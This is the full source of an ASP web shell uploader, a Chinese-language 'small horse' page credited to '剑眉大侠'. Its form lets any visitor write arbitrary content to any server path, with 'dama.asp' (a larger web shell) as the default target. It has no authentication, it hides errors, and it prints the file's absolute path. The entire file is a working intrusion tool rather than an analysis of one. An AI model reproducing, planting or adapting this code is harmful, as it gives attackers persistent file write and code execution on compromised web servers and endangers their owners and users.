<%
Name="by:剑眉大侠"     '名字
Copyright="<< 十步杀一人_千里不留行_事了拂衣去_深藏身与名_生当做人杰_死亦为鬼雄 >>"    '版权
url="www.baidu.com"  '网址
imgurl="http://www.fzl1314.com/uploads/allimg/110116/21340HS3-5.jpg" '图片

Sub RRS(str):response.write(str):End Sub
RRS"<STYLE>td {font-size: 9pt;line-height: 1.5;text-decoration: none;color: #FFFFFF;}"
RRS"a:link {color: #FFFFFF;text-decoration: none;}"
RRS"a:active {color: #0099FF;text-decoration: underline overline;}"
RRS"a:visited {color: #CCCCCC;text-decoration: none;}"
RRS"a:hover {color: #FF0000;text-decoration: underline;}</STYLE>"
RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">"
RRS"<title>"&Name&"</title>"
dim objFSO,fdata,objCountFile
on error resume next
Set objFSO = Server.CreateObject("Scripting.FileSystemObject")
if Trim(request("syfdpath"))<>"" then
fdata = request("cyfddata")
Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True)
objCountFile.Write fdata
if err =0 then response.write "<font color=red>保存成功!</font>"
err.clear
end if
objCountFile.Close
Set objCountFile=Nothing
Set objFSO = Nothing
response.write "<br>"
response.write "本文件绝对路径"
server.mappath(request.servervariables("script_name"))
response.write "<br>"
RRS"<body bgcolor=""#000000""><div align=""center"">"
RRS"  <table width=""540"" border=""0"" cellpadding=""2"" cellspacing=""1"" bgcolor=""#CCCCCC"">"
RRS"    <tr> "
RRS"      <td height=""151"" align=""center"" bgcolor=""#000000""><img src="&imgurl&"></td>"
RRS"    </tr>"
RRS"    <tr> "
RRS"      <td align=""center"" bgcolor=""#000000""><a href="&url&"><font color=""#FFFFFF"" class=>"&Name&"</font></a></td>"
RRS"    </tr>"
RRS"    <tr> "
RRS"      <td align=""center"" bgcolor=""#000000""><form method=post>"
RRS"          <table width=""95%"" border=""0"" cellpadding=""3"" cellspacing=""1"" bgcolor=""#999999"">"
RRS"            <tr> "
RRS"              <td width=""80%"" bgcolor=""#000000""><input type=text name=syfdpath value="&server.mappath("dama.asp")&" size=60></td>"
RRS"              <td bgcolor=""#000000""><input name=""submit"" type=submit value=""保存""></td>"
RRS"            </tr>"
RRS"            <tr> "
RRS"             <td colspan=""2"" bgcolor=""#000000""><textarea name=cyfddata cols=80 rows=10 width=32></textarea></td>"
RRS"            </tr>"
RRS"          </table>"
RRS"        </form></td>"
RRS"    </tr>"
RRS"    <tr>"
RRS"      <td align=""center"" bgcolor=""#000000""><font color=""#FFFFFF"">"&Copyright&"</font></td>"
RRS"    </tr>"
RRS"  </table>"
RRS"</div>"
RRS"</div>"%>